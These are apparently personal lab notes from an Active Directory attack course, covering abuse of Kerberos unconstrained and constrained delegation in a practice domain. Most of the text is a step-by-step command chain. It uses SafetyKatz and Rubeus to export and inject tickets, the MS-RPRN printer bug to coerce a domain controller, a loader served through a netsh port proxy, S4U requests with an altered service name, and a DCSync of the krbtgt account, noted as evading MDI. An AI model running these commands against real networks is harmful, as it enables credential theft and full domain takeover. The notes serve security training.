Kerberos Delegation allows the reuse of end-user credentials to access resources hosted on a different server
- example - user authenticates to a web server (first hop) and web server makes requests to database server (second hop)
- user impersonation is the goal of delegation
![[assets/Pasted image 20260221012448.png]]
- the web server should be able to access the database server as the user (impersonation)
![[assets/Pasted image 20260221012859.png]]
- even though we are in a PowerShell session as adminsrv, the first hope (PowerShell session) is not allowed to delegate to the domain controller

two main solutions
- CredSSP
	- stores credentials in cleartext at first hope
- Constrained and Unconstrained Delegation
	- Constrained - allows the first hope to request access only to specified services on specified computers. if Kerberos authentication is not used to authenticate on the first hop, Protocol Transition is used to transition the request to Kerberos 
	- Unconstrained - allows first hop to request access to any service on any computer in the domain


# Unconstrained Delegation

When this is enabled, the DC places a user's TGT inside the TGS. 
- on the first hope, the TGT is extracted from the TGS and stored in LSASS, so the server can reuse the user's TGT to access any other resource as the user
- this one is ripe for abuse
![[assets/Pasted image 20260221013438.png]]

Discover Domain Computers which have unconstrained delegation enabled
- PowerView
`Get-DomainComputer -UnConstrained`
- ActiveDirectory Module
`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
`Get-ADUser -Filter {TrustedForDelegation -eq $True}`

Once the first hope is compromised, wait for the domain admin to connect to a service
- once they connect
`SafetyKatz.exe "sekurlsa::tickets /export"`
- reuse their token
`SafetyKatz.exe "kerberos::ptt C:\Users\<user>\Documents\<user>\[0;2ceb8b3-2-0-60a10000-Administrator@krbtgt-<DOMAIN>.kirbi"`

Coercion - certain Microsoft services allow any authenticated user to force a machine to connect to a second machine
![[assets/Pasted image 20260221014501.png]]

- capture TGT using Rubeus
`Rubeus.exe monitor /interval:5 /nowrap`

- after TGT is captured, run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) (spooler)
`MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
- forcing domain controller to authenticate to appsrv

- inject the ticket
`Rubeus.exe ptt /ticket`

- once ticket is injected, run DCSync
`SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt"`
- since we are using the TGT of the DC, it will not be detected by MDI



# Learning Objective 15

## Find a server in the dcorp domain where Unconstrained Delegation is enabled

`Get-DomainComputer -Unconstrained`
![[assets/Pasted image 20260221015423.png]]
![[assets/Pasted image 20260221015446.png]]


## Compromise the server and escalate to Domain Admin privileges


copy loader onto system
`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y`

connect to appsrv
`winrs -r:dcorp-appsrv cmd`

port forward
`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1`

run Rubeus listening mode in memory
`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap`

go back to student VM and force domain controller to connect to appsrv
`C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
- even if you get an RPC Server failed error, still check if Rubeus caught a TGT
![[assets/Pasted image 20260221020256.png]]

from an elevated shell, inject the TGT
`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args ptt /ticket:<TGT>`
![[assets/Pasted image 20260221020352.png]]

run DCSync attack with imported ticket
`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:<DOMAIN>\krbtgt"`
- may need to drop `-args`



## Escalate to Enterprise Admin privileges by abusing PrinterBug




## Additionally, abuse Unconstrained Delegation with MS-WSP and MS-DFSNM





# Constrained Delegation

allows access only to specified services on specified computers
- protocol transition is used when a user authenticates to a web service without using Kerberos and t he web service makes requests to a database server to fetch results based on a user's authorization
![[assets/Pasted image 20260221022041.png]]

to impersonate a user, Service for User (S4U) is used which provides two extensions
- S4U2self - allows service to obtains a forwardable TGS to itself on behalf of a user with just the UPN without supplying the password
- S4U2proxy - allows a service to obtain a TGS to a second service on behalf of a user. The second service is controlled by msDS-AllowedToDelegate, which contains a list of SPNs to which user tokens can be forwarded


Enumerate users with constrained delegation enabled
- PowerView
`Get-DomainUser -TrustedtoAuth`
![[assets/Pasted image 20260221023214.png]]
- if i compromise websvc, i can access the file system on dcorp-mssql as DA
`Get-DomainComputer -TrustedtoAuth`
![[assets/Pasted image 20260221024203.png]]
- ActiveDirectory Module
`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`


Request a TGT and TGS in a single command
`Rubeus.exe s4u /user:<user> /aes256:<aes_key> /impersonateuser:Administrator /msdsspn:<SPN> /ptt`
- to get aes key, you can use his mimikatz keys script
	- `./Invoke-MimiEx-keys-std1.ps1`
![[assets/Pasted image 20260221024935.png]]
- make sure to look at the SID for the correct key, keys using SYSTEM privileges will have `S-1-5-18`


since the SPN is in cleartext, we are able to change it to abuse S4U2proxy (choosing services that can delegate)
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:<user> /aes256:<aes_key> /impersonate:Administrator /msdsspn:<SPN> /altservice:ldap /ptt`
- putting the alt service (in this case LDAP) will change what the ticket is used for
![[assets/Pasted image 20260221025516.png]]
![[assets/Pasted image 20260221025553.png]]
- this means you can now run DCSync using this ticket

